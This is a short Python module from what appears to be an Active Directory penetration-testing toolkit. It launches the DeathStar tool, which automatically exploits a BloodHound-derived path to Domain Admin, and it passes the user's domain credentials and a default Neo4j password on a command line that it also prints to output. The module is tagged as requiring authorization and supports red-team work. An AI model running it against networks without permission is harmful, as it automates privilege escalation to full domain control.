"""DeathStar — automated DA path via BloodHound attack graph."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.audit.deathstar.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["automated_exploitation"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["TA0004"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)

    print("[*] DeathStar: automated Domain Admin path")
    print("[*] Uses BloodHound data to find and exploit shortest path to DA")

    import subprocess
    import shutil
    deathstar = shutil.which("DeathStar.py") or shutil.which("deathstar")
    if deathstar:
        cmd = [deathstar, "-u", "neo4j", "-p", "neo4jneo4j",
               "--domain", cred.domain,
               "--username", cred.username or "",
               "--password", cred.password or ""]
        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        return result.returncode

    print("[!] DeathStar not found")
    print("[*] Source: https://github.com/byt3bl33d3r/DeathStar")
    print("[*] Requires: BloodHound data in Neo4j + valid domain credentials")
    return 1
